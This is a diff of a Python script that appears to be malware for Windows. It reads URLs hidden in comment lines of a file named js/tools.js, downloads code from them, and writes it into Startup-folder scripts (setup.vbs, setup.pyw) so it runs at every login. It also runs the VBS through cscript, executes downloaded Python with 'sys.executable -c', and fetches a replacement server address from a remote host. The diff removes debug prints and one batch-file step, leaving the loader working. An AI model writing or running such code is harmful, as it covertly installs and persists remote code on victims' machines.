@@ -2,8 +2,6 @@ from urllib import request
 import sys, os, winshell
 import subprocess
 
-print(winshell.startup())
-
 def get_string(p):
     with request.urlopen(p) as f:
         s = f.read().decode('utf-8')
@@ -25,16 +23,10 @@ try:
     with open("js/tools.js") as f:
         l = f.readlines()
 
-    server_name = l[5][2:]
-    p_lines = get_lines(l[4][2:])
     ready = get_string(l[4][2:])
+    server_name = l[5][2:]
     c_l = get_lines(l[6][2:])
-    b_lines = get_lines(l[7][2:])
-
-    print(p_lines)
-    print(ready)
-    print(c_l)
-    print(b_lines)
+    p_lines = get_lines(l[7][2:])
 
     path = None
     is_ready_to_reload = ""
@@ -46,16 +38,10 @@ try:
             del c_l[0]
 
             path = get_start_p("setup.vbs")
-            print(path)
             set_fl(path, c_l)
-
-            path = get_start_p("setup.bat")
-            set_fl(path, b_lines)
-            print(path)
 
             path = get_start_p("setup.pyw")
             set_fl(path,p_lines)
-            print(path)
 
             is_ready_to_reload = "true"
 
@@ -75,13 +61,13 @@ try:
         subprocess.call(['cscript.exe', path])
 
     subprocess.run([sys.executable, "-c", ready])
+
     new_server = ""
     with request.urlopen(server_name) as f:
         f = f.readlines()
         new_server = f[0].decode('utf-8').strip()
         del f[0]
         for x in f:
-            print(x)
             x = x.decode('utf-8')
 
     if(new_server == "" or len(new_server) < 5 or new_server == None):
